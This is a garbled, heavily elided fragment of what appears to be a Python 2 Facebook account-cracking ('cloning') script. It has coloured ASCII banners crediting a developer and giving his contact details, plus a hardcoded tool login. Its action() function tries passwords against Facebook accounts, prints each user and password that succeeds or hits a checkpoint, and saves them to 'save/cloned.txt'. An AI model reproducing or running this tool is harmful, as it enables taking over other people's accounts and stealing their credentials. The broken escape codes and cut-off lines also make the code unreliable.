...
\033[1;97m\x1b[1;96m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91m\x1b[1;91mDEVOLPER AJ AWAN
                    
\033[1;94m\x1b[1;94mFACEBOOK MALIK AHMAD AWAN
                    
\033[1;91m\x1b[1;95mWhatsap Number +923458630524
                     
\x1b[1;94CSU X ISU TATA DFN BY HHU X DMU 
     \x1b[1;93m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m.\x1b[1;92mBAZIGAAR_007.
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••                
\033[1;92m-\x1b[1;94mHEART HACKER UNITY--------------------------------------
"""
...
────────▀█▀
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m-\x1b[1;93mThe Credit For This Code Goes To AJAWAN..
\033[1;97m
...
\033[1;94mFACEBOOK-\x1b[1;94mMALIK AHMAD AWAN
                  
                     
\033[1;92mWHATAAPP \x1b[1;93m+923458630524
                      
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m -\x1b[1;92mCSUX ISU TATA DFN BY HHU 
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
                                                
\033[1;97m----------------------\x1b[1;96mGUNPOINT_HACKER_FAHEEM--------------------
"""
CorrectUsername = "CSU"
CorrectPassword = "GUNPOINT"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:AJ_AWAN
	    time.sleep(2)
            loop = 'false'
        else:
        ...
        os.system('xdg-https://www.facebook.com/malikahmad.awan.5688476')
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;92m[2] AHMAD AWAN'
    time.sleep(0.10)
    print '\x1b[1;93m[3] BAZIGAAR'
    time.sleep(0.10)
    print '\x1b[1;93m[4] GUNPOINT'
    time.sleep(0.10)
    print '\x1b[1;92m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;91m[6] AHMAD AWAN FB'
    time.sleep(0.10)
...
def action():
    ...
    if peak =='':
        ...
        print '\x1b[1;91mEnter any code on Gun point 01 to 49'
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(\x1b[1;95mAjawan24HORAS) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(\x1b[1;93mAJAWAN CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mAwan
\033[1;95m033[1;97m"""Khuda hafiz gujjar on gun point
